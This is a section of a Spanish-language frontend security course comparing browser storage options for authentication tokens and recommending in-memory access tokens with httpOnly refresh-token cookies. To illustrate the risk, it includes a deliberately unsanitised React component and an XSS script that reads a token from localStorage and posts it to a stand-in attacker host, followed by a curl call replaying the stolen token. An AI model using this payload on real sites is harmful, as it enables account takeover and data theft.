# 1.2 Almacenamiento Seguro de Tokens en el Frontend

> **Sección:** 1.2 | **Duración:** 2 horas | **Nivel:** Intermedio

---

## 📖 Introducción

Una de las decisiones más críticas en seguridad frontend es **dónde almacenar los tokens de autenticación**. La elección incorrecta puede exponer la aplicación a ataques devastadores como XSS (Cross-Site Scripting) o CSRF (Cross-Site Request Forgery).

Esta sección examina cada estrategia de almacenamiento disponible en el navegador, sus vulnerabilidades, y cuándo y cómo usar cada una de forma segura.

---

## 🗃️ Opciones de Almacenamiento en el Navegador

### 1. `localStorage`

```javascript
// Escribir
localStorage.setItem('accessToken', token);

// Leer
const token = localStorage.getItem('accessToken');

// Eliminar
localStorage.removeItem('accessToken');
localStorage.clear();
```

**Características técnicas:**
- Persistente (sobrevive al cierre del navegador)
- Accesible por cualquier script de la misma **origin** (`schema://domain:port`)
- Capacidad: ~5-10 MB según el navegador
- Sincrónico (bloquea el hilo principal)
- Compartido entre todas las pestañas del mismo origen

### 2. `sessionStorage`

```javascript
// Misma API que localStorage
sessionStorage.setItem('accessToken', token);
const token = sessionStorage.getItem('accessToken');
```

**Características técnicas:**
- Temporal (se borra al cerrar la pestaña)
- Cada pestaña tiene su propio `sessionStorage` aislado
- Accesible por cualquier script de la misma origin
- Capacidad: ~5 MB

### 3. Cookies

```javascript
// Crear cookie desde JavaScript
document.cookie = 'accessToken=valor; path=/; max-age=900; SameSite=Strict';

// Leer cookies visibles para JS
const cookies = document.cookie; // "name1=val1; name2=val2"
```

**Tipos de cookies relevantes:**

| Atributo | Descripción | Impacto de Seguridad |
|----------|-------------|----------------------|
| `HttpOnly` | No accesible por JavaScript | ✅ Protege contra XSS |
| `Secure` | Solo enviada por HTTPS | ✅ Protege contra interceptación |
| `SameSite=Strict` | No enviada en requests cross-site | ✅ Protege contra CSRF |
| `SameSite=Lax` | Solo en navegación top-level | ⚠️ Protección parcial CSRF |
| `SameSite=None` | Enviada en todos los contextos | ❌ Requiere `Secure` |
| `Domain` | Subdominios que reciben la cookie | Configurar con cuidado |
| `Path` | Ruta donde aplica la cookie | Limitar al mínimo necesario |
| `Max-Age` / `Expires` | Duración de la cookie | Limitar según necesidad |

### 4. Memoria RAM (Variables JavaScript)

```javascript
// El token vive solo en el scope de la aplicación
let accessToken = null;

export function setToken(token) {
  accessToken = token;
}

export function getToken() {
  return accessToken;
}

export function clearToken() {
  accessToken = null;
}
```

**Características técnicas:**
- Efímera: se pierde al recargar la página o cerrar la pestaña
- Solo accesible desde el código de tu aplicación
- No persistida en ningún lugar del disco
- No accesible por scripts de terceros (a menos que tengan XSS)

---

## ⚠️ Riesgos: localStorage y XSS

### ¿Por qué localStorage es peligroso para tokens?

La vulnerabilidad fundamental es que **cualquier código JavaScript con acceso al origen puede leer localStorage**. Si un atacante logra inyectar código JavaScript en tu página (XSS), puede robar inmediatamente todos los tokens almacenados.

### Escenario de Ataque XSS → Robo de Token

```
ATAQUE PASO A PASO:
═══════════════════

Paso 1: Encontrar vulnerabilidad XSS
─────────────────────────────────────
La aplicación renderiza contenido de un comentario de usuario sin sanitizar:

    // VULNERABLE (no sanitiza el input del usuario)
    function Comment({ content }) {
      return <div dangerouslySetInnerHTML={{ __html: content }} />;
    }

Paso 2: El atacante publica un comentario malicioso
────────────────────────────────────────────────────
Comentario publicado en el blog:

    <script>
      // Este código se ejecuta en el contexto de tu dominio
      const token = localStorage.getItem('accessToken');
      
      // Enviar el token al servidor del atacante
      fetch('https://servidor-atacante.com/steal', {
        method: 'POST',
        body: JSON.stringify({ token }),
        mode: 'no-cors'
      });
    </script>

Paso 3: Víctima visita la página
──────────────────────────────────
Cuando María (víctima) visita el blog:
- Su navegador ejecuta el script malicioso
- El token de María se envía al atacante
- El atacante tiene acceso completo a la cuenta de María
- María no recibe ninguna notificación

Paso 4: El atacante usa el token robado
─────────────────────────────────────────
    # Desde la terminal del atacante:
    curl -H "Authorization: Bearer TOKEN_ROBADO" \
         https://api.empresa.com/users/me
    # Responde con todos los datos de María
```

### Por qué httpOnly Cookie es más segura contra XSS

```javascript
// ATAQUE XSS intentando robar una httpOnly cookie
const cookie = document.cookie; // ❌ NO contiene cookies httpOnly

// Intento 2: Acceder directamente
const refreshToken = document.cookie
  .split(';')
  .find(c => c.includes('refreshToken'));
// ❌ No aparece — el navegador la oculta completamente de JS

// ✅ La cookie httpOnly solo es enviada automáticamente por el navegador
// en cada request HTTP — JS nunca puede leerla ni robarla
```

---

## 🛡️ Cookies httpOnly: La Mejor Opción para Refresh Tokens

### Configuración del Servidor (Node.js/Express)

```javascript
// server.js - Backend Express
const express = require('express');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());

// Constantes de configuración de cookies
const COOKIE_OPTIONS = {
  httpOnly: true,           // ✅ JavaScript no puede leer esta cookie
  secure: process.env.NODE_ENV === 'production', // ✅ Solo HTTPS en prod
  sameSite: 'strict',       // ✅ No se envía en requests cross-site (CSRF)
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 días en milisegundos
  path: '/auth',            // ✅ Solo se envía a rutas /auth/*
  // domain: '.empresa.com' // Si necesitas compartir entre subdominios
};

// Endpoint de login: establece cookie httpOnly
app.post('/auth/login', async (req, res) => {
  const { email, password } = req.body;
  
  // ... verificar credenciales ...
  
  const { accessToken, refreshToken } = generateTokenPair(user);
  
  // ✅ Refresh token en cookie httpOnly (seguro contra XSS)
  res.cookie('refreshToken', refreshToken, COOKIE_OPTIONS);
  
  // Access token en el cuerpo (el frontend lo guarda en memoria)
  res.json({
    accessToken,
    expiresIn: 900, // 15 minutos
    user: { id: user.id, email: user.email, roles: user.roles }
  });
});

// Endpoint de refresh: usa el RT de la cookie httpOnly
app.post('/auth/refresh', async (req, res) => {
  const { refreshToken } = req.cookies;
  
  if (!refreshToken) {
    return res.status(401).json({ error: 'No hay sesión activa' });
  }
  
  try {
    const { userId } = verifyRefreshToken(refreshToken);
    const user = await getUserById(userId);
    
    // Rotar el refresh token (invalidar el anterior, emitir uno nuevo)
    const { accessToken, refreshToken: newRefreshToken } = generateTokenPair(user);
    
    // Actualizar la cookie httpOnly con el nuevo refresh token
    res.cookie('refreshToken', newRefreshToken, COOKIE_OPTIONS);
    
    res.json({ accessToken, expiresIn: 900 });
  } catch (error) {
    // Limpiar la cookie si el RT es inválido
    res.clearCookie('refreshToken', { path: '/auth' });
    res.status(401).json({ error: 'Sesión expirada' });
  }
});

// Logout: eliminar la cookie httpOnly
app.post('/auth/logout', (req, res) => {
  // Revocar el refresh token en la base de datos
  const { refreshToken } = req.cookies;
  if (refreshToken) {
    revokeRefreshToken(refreshToken);
  }
  
  // Eliminar la cookie
  res.clearCookie('refreshToken', { path: '/auth' });
  res.json({ message: 'Sesión cerrada' });
});
```

---

## 📊 Tabla Comparativa de Estrategias de Almacenamiento

| Característica               | localStorage | sessionStorage | Cookie JS | httpOnly Cookie | Memoria (JS) |
|------------------------------|:------------:|:--------------:|:---------:|:---------------:|:------------:|
| **Persiste al recargar**     | ✅ Sí        | ❌ No          | ✅ Sí     | ✅ Sí           | ❌ No        |
| **Persiste entre pestañas**  | ✅ Sí        | ❌ No          | ✅ Sí     | ✅ Sí           | ❌ No        |
| **Accesible por JS**         | ✅ Sí        | ✅ Sí          | ✅ Sí     | ❌ No           | ✅ Sí        |
| **Protegido contra XSS**     | ❌ No        | ❌ No          | ❌ No     | ✅ Sí           | ⚠️ Parcial  |
| **Protegido contra CSRF**    | ✅ Sí        | ✅ Sí          | ❌ No     | ⚠️ Con SameSite | ✅ Sí        |
| **Enviado automáticamente**  | ❌ No        | ❌ No          | ✅ Sí     | ✅ Sí           | ❌ No        |
| **Configurable por servidor**| ❌ No        | ❌ No          | ⚠️ Parcial| ✅ Sí           | ❌ No        |
| **Capacidad**                | ~5-10 MB     | ~5 MB          | ~4 KB     | ~4 KB           | Sin límite   |
| **Recomendado para AT**      | ❌           | ❌             | ❌        | ❌              | ✅           |
| **Recomendado para RT**      | ❌           | ❌             | ❌        | ✅              | ❌           |

**Leyenda:**
- **AT** = Access Token (corta duración)
- **RT** = Refresh Token (larga duración)

---

## 🎯 Estrategia Recomendada: Token Híbrido

La estrategia más segura para aplicaciones empresariales es la combinación:

```
┌─────────────────────────────────────────────────────────────┐
│              ESTRATEGIA HÍBRIDA RECOMENDADA                 │
│                                                             │
│  ACCESS TOKEN                    REFRESH TOKEN              │
│  ─────────────────               ────────────────────       │
│  • Almacenado en: Memoria JS     • Almacenado en:           │
│  • Vida útil: 5-30 minutos         httpOnly Cookie          │
│  • Contenido: User ID,           • Vida útil: 7-30 días     │
│    roles, permisos               • Contenido: Session ID    │
│  • Enviado: Header Manual        • Enviado: Automático      │
│    Authorization: Bearer <AT>      por el navegador         │
│                                                             │
│  VENTAJAS:                                                  │
│  ✅ AT no accesible por XSS (no en DOM)                     │
│  ✅ RT no robable por XSS (httpOnly)                        │
│  ✅ RT no usado en CSRF (SameSite=Strict)                   │
│  ✅ AT de corta duración limita el impacto del robo         │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔒 Mejores Prácticas

### ✅ Hacer

1. **Access token en memoria** (variable JS, nunca en localStorage).
2. **Refresh token en httpOnly cookie** con atributos `Secure` y `SameSite=Strict`.
3. **Configurar `Path` de la cookie** al mínimo necesario (`/auth`).
4. **Implementar CSRF token** si usas cookies en endpoints mutantes (POST, PUT, DELETE).
5. **Rotar refresh tokens** en cada uso.
6. **Limpiar tokens al cerrar sesión** tanto del cliente como del servidor.
7. **Tiempos de expiración cortos** para access tokens (máx 30 min).

### ❌ No Hacer

1. **Nunca** guardar tokens de autenticación en `localStorage`.
2. **Nunca** guardar tokens en `sessionStorage` (sigue siendo accesible por XSS).
3. **Nunca** incluir tokens en URLs (query strings), están en logs del servidor.
4. **No usar cookies** sin los atributos `HttpOnly`, `Secure` y `SameSite`.
5. **No hardcodear secretos** en el código fuente del frontend.
6. **No confiar en el token del lado del frontend** para decisiones de seguridad.

---

## 🔗 Referencias

- [OWASP - HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
- [MDN - Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)
- [MDN - HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [OWASP - Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [RFC 6265 - HTTP State Management Mechanism](https://datatracker.ietf.org/doc/html/rfc6265)

---

## 📂 Ejemplos y Ejercicios

- [📄 Ejemplo Básico: localStorage vs memoria](./ejemplos/basico.md)
- [📄 Ejemplo Intermedio: Configuración de cookies seguras](./ejemplos/intermedio.md)
- [📄 Ejemplo Avanzado: Gestor de tokens completo](./ejemplos/avanzado.md)
- [📝 Ejercicios Prácticos](./ejercicios.md)

---

*← [Sección 1.1: Fundamentos JWT](../1.1-fundamentos-autenticacion/README.md) | [→ Sección 1.3: Vulnerabilidades](../1.3-vulnerabilidades/README.md)*
